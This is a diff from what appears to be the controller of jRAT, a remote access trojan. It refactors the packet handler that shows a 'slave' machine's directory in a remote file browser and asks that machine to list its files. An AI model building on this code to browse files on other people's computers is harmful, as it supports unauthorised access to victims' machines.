@@ -4,7 +4,7 @@ import java.io.DataInputStream;
 
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet15ListFiles;
-import se.jrat.client.ui.frames.FrameRemoteFilesOld;
+import se.jrat.client.ui.frames.FrameRemoteFiles;
 
 
 public class Packet34CustomDirectory extends AbstractIncomingPacket {
@@ -13,11 +13,11 @@ public class Packet34CustomDirectory extends AbstractIncomingPacket {
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		String where = slave.readLine().replace("/", slave.getFileSeparator()).replace("\\", slave.getFileSeparator());
 
-		FrameRemoteFilesOld frame = FrameRemoteFilesOld.instances.get(slave);
+		FrameRemoteFiles frame = FrameRemoteFiles.INSTANCES.get(slave);
 		if (frame != null) {
-			frame.setRemoteDir(where);
-			while (frame.model.getRowCount() > 0) {
-				frame.model.removeRow(0);
+			frame.remoteTable.setDirectory(where);
+			while (frame.remoteTable.tableModel.getRowCount() > 0) {
+				frame.remoteTable.tableModel.removeRow(0);
 			}
 			slave.addToSendQueue(new Packet15ListFiles(where));
 		}
